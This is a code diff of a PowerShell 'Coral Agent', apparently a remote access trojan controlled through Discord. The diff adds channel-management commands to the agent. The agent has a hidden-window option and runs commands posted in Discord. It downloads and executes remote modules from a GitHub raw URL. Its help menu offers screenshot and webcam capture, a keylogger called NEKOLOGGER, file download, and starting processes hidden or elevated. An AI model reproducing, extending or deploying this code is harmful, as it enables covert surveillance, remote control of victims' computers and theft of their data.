+                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                        Set_MainChannel -channelName $channelName
+                    } else {
+                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``SETCHANNEL <channel-name>``" -Color "13369344"
+                    }
+                }
+                'REMOVECHANNEL' {
+                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
+                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                        Remove_ChannelFromRegistry -channelName $channelName -DeleteFromDiscord:$true
+                    } else {
+                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``REMOVECHANNEL <channel-name>``" -Color "13369344"
+                    }
+                }
+                'UNREGISTERCHANNEL' {
+                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
+                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                        Remove_ChannelFromRegistry -channelName $channelName -DeleteFromDiscord:$false
+                    } else {
+                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``UNREGISTERCHANNEL <channel-name>``" -Color 13369344
+                    }
+                }
+                'TESTCHANNEL' {
+                    if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
+                        $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                        sendEmbedWithImage -Title "Channel Test" -Description ":test_tube: **This message was sent to:** ``$channelName``" -ChannelTarget $channelName
+                    } else {
+                        sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``TESTCHANNEL <channel-name>``" -Color 13369344
+                    }
+                }
+                
                 default {
                     if ($command -eq "SETTHEME" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                         $themeName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
@@ -648,7 +1045,7 @@ function Start_AgentJob {
                                 if ($errorMsg.Length -gt 1000) {
                                     $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
                                 }
-                                sendEmbedWithImage -Title ":x: **Error executing command**" -Description "``````$errorMsg``````"
+                                sendEmbedWithImage -Title "ERROR" -Description " :x: **Error executing command**`n``````$errorMsg``````" -Color 13369344
                             }
                         }
                     }
@@ -656,8 +1053,10 @@ function Start_AgentJob {
             }
         }
         
-        # Rest of function remains the same...
-    } -ArgumentList $ScriptString, $global:token, $global:SessionID, $global:CategoryID, $global:ModuleRegistry, $global:themes, $global:currenttheme, $global:theme_enabled
+        # Execute the provided command
+        Execute_JobCommand -CommandString $ScriptString
+        
+    } -ArgumentList $ScriptString, $global:token, $global:SessionID, $global:CategoryID, $global:ModuleRegistry, $global:themes, $global:currenttheme, $global:theme_enabled, $global:ChannelRegistry
     
     $script:Jobs[$RandName] = $job
     sendEmbedWithImage -Title JOB -Description ":gear: **Job Started:** ``$RandName`` | ID: $($job.Id)"
@@ -706,7 +1105,7 @@ function Remove_AgentJob {
         $script:Jobs.Remove($JobName)
         sendEmbedWithImage -Title "Job Removed" -Description ":stop_sign: **Job Removed:** ``$JobName``"
     } else {
-        sendEmbedWithImage -Title "Job Not Found" -Description ":x: **Job Not Found:** ``$JobName``"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Job Not Found:** ``$JobName``" -Color 13369344
     }
 }
 
@@ -746,8 +1145,8 @@ function Get_AgentJobOutput {
         }
         
         sendEmbedWithImage -Title "Job Output" -Description $msg
-    } else {
-        sendEmbedWithImage -Title "Job Not Found" -Description ":x: **Job Not Found:** ``$JobName``"
+    } else { 
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Job Not Found:** ``$JobName``" -Color 13369344
     }
 }
 
@@ -869,6 +1268,14 @@ $global:ModuleRegistry = @{
         required = $true
     }
     
+    # Channel Management Module
+    channels = @{
+        name = "Channel Management System"
+        functions = @("CREATECHANNEL", "LISTCHANNELS", "SETCHANNEL", "REMOVECHANNEL", "UNREGISTERCHANNEL", "TESTCHANNEL", "NewChannel", "Get_OrCreateChannel", "List_Channels", "Remove_ChannelFromRegistry", "Set_MainChannel")
+        loaded = $true
+        required = $true
+    }
+    
     # System Module
     system = @{
         name = "System Management"
@@ -900,8 +1307,6 @@ $global:ModuleRegistry = @{
         loaded = $true
         required = $true
     }
-    
-    
     
     # Remote modules
     recon = @{
@@ -1030,90 +1435,91 @@ $global:ModuleRegistry = @{
         loaded = $false
         required = $false
     }
+    
     PROCESS_MANAGEMENT = @{
-    name = "Process Management Module"
-    baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/process_management/"
-    scripts = @{
-        PROCESSLIST = @{
-            url = "Mprocess_management.ps1"
-            function = "MGet_ProcessList"
-            alias = "PROCESSLIST"
-            description = "Get list of running processes"
-            params = @("filter", "sortBy")
+        name = "Process Management Module"
+        baseUrl = "https://raw.githubusercontent.com/JoshuaBrien/Compilation-of-stuff-i-done/refs/heads/main/Coral_network_discordONLY/modules/process_management/"
+        scripts = @{
+            PROCESSLIST = @{
+                url = "Mprocess_management.ps1"
+                function = "MGet_ProcessList"
+                alias = "PROCESSLIST"
+                description = "Get list of running processes"
+                params = @("filter", "sortBy")
+            }
+            KILLPROCESS = @{
+                url = "Mprocess_management.ps1"
+                function = "MKill_Process"
+                alias = "KILLPROCESS"
+                description = "Terminate a process by name or PID"
+                params = @("processName", "processId")
+            }
+            STARTPROCESS = @{
+                url = "Mprocess_management.ps1"
+                function = "MStart_Process"
+                alias = "STARTPROCESS"
+                description = "Start a new process"
+                params = @("executablePath", "arguments", "hidden", "elevated")
+            }
+            ADDBLACKLIST = @{
+                url = "Mprocess_management.ps1"
+                function = "MAdd_ProcessBlacklist"
+                alias = "ADDBLACKLIST"
+                description = "Add process to blacklist (auto-terminate)"
+                params = @("processName")
+            }
+            REMOVEBLACKLIST = @{
+                url = "Mprocess_management.ps1"
+                function = "MRemove_ProcessBlacklist"
+                alias = "REMOVEBLACKLIST"
+                description = "Remove process from blacklist"
+                params = @("processName")
+            }
+            SHOWBLACKLIST = @{
+                url = "Mprocess_management.ps1"
+                function = "MShow_ProcessBlacklist"
+                alias = "SHOWBLACKLIST"
+                description = "Show current process blacklist"
+                params = @()
+            }
+            STARTPROCESSMONITOR = @{
+                url = "Mprocess_management.ps1"
+                function = "MStart_ProcessMonitoring"
+                alias = "ENABLEPROCESSMONITOR"
+                description = "Start monitoring for new processes"
+                params = @("intervalSeconds")
+            }
+            STOPPROCESSMONITOR = @{
+                url = "Mprocess_management.ps1"
+                function = "MStop_ProcessMonitoring"
+                alias = "DISABLEPROCESSMONITOR"
+                description = "Stop process monitoring"
+                params = @()
+            }
+            PROCESSMONITORSTATUS = @{
+                url = "Mprocess_management.ps1"
+                function = "MGet_ProcessMonitoringStatus"
+                alias = "PROCESSMONITORSTATUS"
+                description = "Check process monitoring status"
+                params = @()
+            }
+            PROCESSDETAILS = @{
+                url = "Mprocess_management.ps1"
+                function = "MGet_ProcessDetails"
+                alias = "PROCESSDETAILS"
+                description = "Get detailed information about a process"
+                params = @("processName", "processId")
+            }
+            PROCESSMONITORCLEANUP = @{
+                url = "Mprocess_management.ps1"
+                function = "MProcMon_Cleanup"
+                alias = "PROCESSMONITORCLEANUP"
+                description = "Clean up process monitoring data"
+                params = @()
+            }
         }
-        KILLPROCESS = @{
-            url = "Mprocess_management.ps1"
-            function = "MKill_Process"
-            alias = "KILLPROCESS"
-            description = "Terminate a process by name or PID"
-            params = @("processName", "processId")
-        }
-        STARTPROCESS = @{
-            url = "Mprocess_management.ps1"
-            function = "MStart_Process"
-            alias = "STARTPROCESS"
-            description = "Start a new process"
-            params = @("executablePath", "arguments", "hidden", "elevated")
-        }
-        ADDBLACKLIST = @{
-            url = "Mprocess_management.ps1"
-            function = "MAdd_ProcessBlacklist"
-            alias = "ADDBLACKLIST"
-            description = "Add process to blacklist (auto-terminate)"
-            params = @("processName")
-        }
-        REMOVEBLACKLIST = @{
-            url = "Mprocess_management.ps1"
-            function = "MRemove_ProcessBlacklist"
-            alias = "REMOVEBLACKLIST"
-            description = "Remove process from blacklist"
-            params = @("processName")
-        }
-        SHOWBLACKLIST = @{
-            url = "Mprocess_management.ps1"
-            function = "MShow_ProcessBlacklist"
-            alias = "SHOWBLACKLIST"
-            description = "Show current process blacklist"
-            params = @()
-        }
-        STARTPROCESSMONITOR = @{
-            url = "Mprocess_management.ps1"
-            function = "MStart_ProcessMonitoring"
-            alias = "ENABLEPROCESSMONITOR"
-            description = "Start monitoring for new processes"
-            params = @("intervalSeconds")
-        }
-        STOPPROCESSMONITOR = @{
-            url = "Mprocess_management.ps1"
-            function = "MStop_ProcessMonitoring"
-            alias = "DISABLEPROCESSMONITOR"
-            description = "Stop process monitoring"
-            params = @()
-        }
-        PROCESSMONITORSTATUS = @{
-            url = "Mprocess_management.ps1"
-            function = "MGet_ProcessMonitoringStatus"
-            alias = "PROCESSMONITORSTATUS"
-            description = "Check process monitoring status"
-            params = @()
-        }
-        PROCESSDETAILS = @{
-            url = "Mprocess_management.ps1"
-            function = "MGet_ProcessDetails"
-            alias = "PROCESSDETAILS"
-            description = "Get detailed information about a process"
-            params = @("processName", "processId")
-        }
-        PROCESSMONITORCLEANUP = @{
-            url = "Mprocess_management.ps1"
-            function = "MProcMon_Cleanup"
-            alias = "PROCESSMONITORCLEANUP"
-            description = "Clean up process monitoring data"
-            params = @()
-        }
-    }
-    loaded = $false
-    required = $false
+        loaded = $false
+        required = $false
     }
 }
 function Is_LocalFunction {
@@ -1215,7 +1621,7 @@ function Execute_DynamicCommand {
             & $Command
             return $true
         } catch {
-            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)" -Color 13369344
             return $false
         }
     }
@@ -1233,7 +1639,7 @@ function Execute_DynamicCommand {
         $script = $commandInfo.Script
         
         try {
-            sendEmbedWithImage -Title "Loading Remote Function" -Description ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
+            sendEmbedWithImage -Title "LOADING REMOTE FUNCTION" -Description ":gear: **Loading:** ``$($script.alias)`` **from module:** ``$($commandInfo.ModuleName)``"
 
             # Download and execute the remote script
             $fullUrl = $module.baseUrl + $script.url
@@ -1248,7 +1654,7 @@ function Execute_DynamicCommand {
             return $true
             
         } catch {
-            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)" -Color 13369344
             return $false
         }
     } else {
@@ -1257,7 +1663,7 @@ function Execute_DynamicCommand {
             & $commandInfo.FunctionName
             return $true
         } catch {
-            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)" -Color 13369344
             return $false
         }
     }
@@ -1347,7 +1753,7 @@ function Execute_DynamicCommandWithParams {
             }
             return $true
         } catch {
-            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing local function:** ``$Command`` - $($_.Exception.Message)" -Color 13369344
             return $false
         }
     }
@@ -1393,7 +1799,7 @@ function Execute_DynamicCommandWithParams {
             return $true
             
         } catch {
-            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error loading remote function:** ``$($script.alias)`` - $($_.Exception.Message)" -Color 13369344
             return $false
         }
     } else {
@@ -1406,7 +1812,7 @@ function Execute_DynamicCommandWithParams {
             }
             return $true
         } catch {
-            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)"
+            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing function:** ``$($commandInfo.FunctionName)`` - $($_.Exception.Message)" -Color 13369344
             return $false
         }
     }
@@ -1427,15 +1833,10 @@ function Get_FunctionHelp {
             params = @("function")
             usage = "HELP or HELP <function>"
         }
-        "GETMODULES" = @{
+        "MODULES" = @{
             description = "List all available modules and their status"
             params = @()
-            usage = "GETMODULES"
-        }
-        "COMMANDS" = @{
-            description = "List all available functions from loaded modules"
-            params = @()
-            usage = "COMMANDS"
+            usage = "MODULES"
         }
         "CREATEJOB" = @{
             description = "Create a new background job"
@@ -1497,6 +1898,36 @@ function Get_FunctionHelp {
             params = @("path")
             usage = "DOWNLOADFILE [path] (send message with file attachments first)"
         }
+        "CREATECHANNEL" = @{
+            description = "Create a new Discord channel"
+            params = @("name")
+            usage = "CREATECHANNEL <channel-name>"
+        }
+        "LISTCHANNELS" = @{
+            description = "List all registered channels and discover new ones"
+            params = @("details", "refresh")
+            usage = "LISTCHANNELS, LISTCHANNELS -details, LISTCHANNELS -refresh, or LISTCHANNELS -details -refresh"
+        }
+        "SETCHANNEL" = @{
+            description = "Set the main channel for commands"
+            params = @("name")
+            usage = "SETCHANNEL <channel-name>"
+        }
+        "REMOVECHANNEL" = @{
+            description = "Delete a channel from Discord and remove from registry"
+            params = @("name")
+            usage = "REMOVECHANNEL <channel-name>"
+        }
+        "UNREGISTERCHANNEL" = @{
+            description = "Remove a channel from registry only (doesn't delete from Discord)"
+            params = @("name")
+            usage = "UNREGISTERCHANNEL <channel-name>"
+        }
+        "TESTCHANNEL" = @{
+            description = "Send a test message to a specific channel"
+            params = @("name")
+            usage = "TESTCHANNEL <channel-name>"
+        }
         "EXIT" = @{
             description = "Disconnect from the Coral Network"
             params = @()
@@ -1510,7 +1941,7 @@ function Get_FunctionHelp {
     if ($hardcodedCommands.ContainsKey($functionUpper)) {
         $cmdInfo = $hardcodedCommands[$functionUpper]
         
-        $msg += "**Description:** $($cmdInfo.description)`n"
+        $msg = "**Description:** $($cmdInfo.description)`n"
         $msg += "**Type:** Hardcoded Command`n"
         
         if ($cmdInfo.params.Count -gt 0) {
@@ -1529,13 +1960,13 @@ function Get_FunctionHelp {
     $commandInfo = Find_CommandInRegistry -Command $FunctionName
     
     if (-not $commandInfo.Found) {
-        sendEmbedWithImage -Title "ERROR" -Description ":x: **Function not found:** ``$FunctionName```n:information_source: **Use** ``HELP`` OR ``MODULES`` **to view all available functions**"
+        sendEmbedWithImage -Title "ERROR" -Description ":x: **Function not found:** ``$FunctionName```n:information_source: **Use** ``HELP`` OR ``MODULES`` **to view all available functions**" -Color 13369344
         return
     }
     
     if ($commandInfo.IsRemote) {
         $script = $commandInfo.Script
-        $msg += "**Description:** $($script.description)`n"
+        $msg = "**Description:** $($script.description)`n"
         $msg += "**Module:** $($commandInfo.ModuleName) (Remote)`n"
         
         if ($script.params.Count -gt 0) {
@@ -1559,14 +1990,14 @@ function display_help {
                                          
 Welcome to the Coral Agent Help Menu!
 
-Basic Commands:
+**Basic Commands:**
 -> **TEST**: Test the connection to the Coral Network
 -> **HELP**: Display this help menu
 -> **HELP <function>**: Get detailed help for a specific function
 -> **EXIT**: Disconnect from the Coral Network
 
 **Module Management:**
--> **GETMODULES:** List all available modules and their status plus details about their commands
+-> **MODULES:** List all available modules and their status plus details about their commands
 
 **Job Management:**
 -> **JOBS:** List all active jobs with their status
@@ -1578,10 +2009,29 @@ Basic Commands:
 
 **Job Examples:**
 -> ``CREATEJOB SCREENSHOT``
--> ``CREATEJOB WEBCAM ``
+-> ``CREATEJOB WEBCAM``
 -> ``CREATEJOB ENABLENEKOLOGGER``
 
-**Theme System (WIP!s):**
+**Channel Management:**
+-> **CREATECHANNEL <name>:** Create a new Discord channel
+-> **LISTCHANNELS:** List registered channels and discover new ones
+-> **LISTCHANNELS -details:** Show detailed channel information
+-> **LISTCHANNELS -refresh:** Force complete refresh of channel registry
+-> **LISTCHANNELS -details -refresh:** Force refresh with detailed info
+-> **SETCHANNEL <name>:** Set the main channel for commands
+-> **REMOVECHANNEL <name>:** Delete channel from Discord and remove from registry
+-> **UNREGISTERCHANNEL <name>:** Remove from registry only (keeps Discord channel)
+-> **TESTCHANNEL <name>:** Send a test message to specific channel
+
+**Channel Examples:**
+-> ``REMOVECHANNEL old-logs``      # Deletes from Discord + removes from registry
+-> ``UNREGISTERCHANNEL temp-channel`` # Removes from registry only
+-> ``LISTCHANNELS``              # Smart discovery + basic list
+-> ``LISTCHANNELS -details``     # Smart discovery + detailed info
+-> ``LISTCHANNELS -refresh``     # Complete rebuild + basic list
+-> ``LISTCHANNELS -details -refresh``  # Complete rebuild + detailed info
+
+**Theme System:**
 -> **GETTHEME:** Show current theme status and details
 -> **SETTHEME <name>:** Set theme (darktheme, neko_maid, neko_kimono, neko_cafe)
 -> **ENABLETHEME:** Enable theme functionality
@@ -1592,13 +2042,15 @@ Basic Commands:
 -> **DOWNLOADFILE [path]:** Download file attachments from Discord
 
 **Parameter Usage Examples:**
-**Positional:** ``SETTHEME neko_maid`` ``ENABLENEKOLOGGER 60``
-**Named:** ``SETTHEME -name neko_maid`` ``CREATEJOB -command SCREENSHOT``
+**Positional:** ``SETTHEME neko_maid`` ``ENABLENEKOLOGGER 60`` ``CREATECHANNEL my-channel``
+**Named:** ``SETTHEME -name neko_maid`` ``CREATEJOB -command SCREENSHOT`` ``TESTCHANNEL -name logs``
 
-:information_source: **Use** ``MODULES`` **to see all available modules including NEKOLOGGER**
+:information_source: **Use** ``MODULES`` **to see all available modules including PROCESS_MANAGEMENT, NEKOLOGGER, etc.**
 :question: **Use** ``HELP <function>`` **for detailed function help**
+:file_folder: **Use** ``LISTCHANNELS`` **to see all available channels**
 
-**Note:** Dynamic functions (SCREENSHOT, WEBCAM, ENABLENEKOLOGGER, etc.) are only loaded when called
+**Note:** Dynamic functions (SCREENSHOT, WEBCAM, PROCESSLIST, etc.) are only loaded when called
+**Tip:** Different modules can send messages to their own dedicated channels automatically!
 "
     sendEmbedWithImage -Title "Coral Agent Help Menu" -Description $message
 }
@@ -1614,15 +2066,17 @@ try { $global:botId = Get_BotUserId } catch { exit 1 }
 try {
     if (!(CheckCategoryExists)) {
         NewChannelCategory
-        NewChannel -name 'coral-control'
-        $global:SessionID = $ChannelID
+        $mainChannelId = NewChannel -name 'coral-control' -assignTo "main"
+        $global:SessionID = $mainChannelId
     } else {
-        $global:SessionID = $ChannelID
+        # Register the existing coral-control channel
+        $global:ChannelRegistry['coral-control'] = $global:ChannelID
+        $global:SessionID = $global:ChannelID
     }
 } catch { exit 1 }
 
 if ($global:hidewindow) { try { HideWindow } catch {} }
-try { sendEmbedWithImage -Title "Connected to Coral Network" -Description "You are now connected to the Coral Network." } catch { exit 1 }
+try { sendEmbedWithImage -Title "Connected to Coral Network" -Description "You are now connected to the Coral Network." } catch { exit 1 } 
 GetFfmpeg
 # =============================== MAIN LOOP ===============================
 while ($true) {
@@ -1658,6 +2112,55 @@ while ($true) {
             'DISABLETHEME' { DisableTheme }
             'JOBS' { List_AgentJobs }
             'STOPALLJOBS' { Stop_AllAgentJobs }
+            #CHANNELS
+            'CREATECHANNEL' {
+                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
+                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                    NewChannel -name $channelName
+                } else {
+                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``CREATECHANNEL <channel-name>``" -Color 13369344
+                }
+            }
+
+            'LISTCHANNELS' {
+                $showDetails = $parameters.ContainsKey("details") -or $parameters.ContainsKey("d")
+                $forceRefresh = $parameters.ContainsKey("refresh") -or $parameters.ContainsKey("r")
+                List_Channels -ShowDetails:$showDetails -ForceRefresh:$forceRefresh
+            }
+            'SETCHANNEL' {
+                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
+                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                    Set_MainChannel -channelName $channelName
+                } else {
+                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``SETCHANNEL <channel-name>``" -Color 13369344 
+                }
+            }
+
+            'REMOVECHANNEL' {
+                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
+                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                    Remove_ChannelFromRegistry -channelName $channelName
+                } else {
+                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``REMOVECHANNEL <channel-name>``" -Color 13369344
+                }
+            }
+
+            'UNREGISTERCHANNEL' {
+                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
+                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                    Remove_ChannelFromRegistry -channelName $channelName -DeleteFromDiscord:$false
+                } else {
+                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``UNREGISTERCHANNEL <channel-name>``" -Color 13369344
+                }
+            }
+            'TESTCHANNEL' {
+                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
+                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
+                    sendEmbedWithImage -Title "Channel Test" -Description ":test_tube: **This message was sent to:** ``$channelName``" -ChannelTarget $channelName
+                } else {
+                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``TESTCHANNEL <channel-name>``" -Color 13369344
+                }
+            }
             'EXIT' { 
                 sendEmbedWithImage -Title "DISCONNECTING..." -Description "**$env:COMPUTERNAME disconnecting from Coral Network**"
                 Stop_AllAgentJobs
@@ -1716,7 +2219,7 @@ while ($true) {
                             downloadFile -attachmentUrl $fileUrl -fileName $fileName -downloadPath $downloadPath
                         }
                     } else {
-                        sendEmbedWithImage -Title "ERROR" -Description ":x: **No file attachments found in the message**"
+                        sendEmbedWithImage -Title "ERROR" -Description ":x: **No file attachments found in the message**" -Color 13369344
                         sendEmbedWithImage -Title "Usage" -Description ":information_source: **Usage:** Send a message with file attachments and the command ``DOWNLOADFILE [path]``"
                     }
                 }
@@ -1739,7 +2242,7 @@ while ($true) {
                             if ($errorMsg.Length -gt 1000) {
                                 $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
                             }
-                            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing command:** ``$latestMessage```n**Error:** $errorMsg"
+                            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing command:** ``$latestMessage```n**Error:** $errorMsg" -Color 13369344
                         }
                     }
                 }
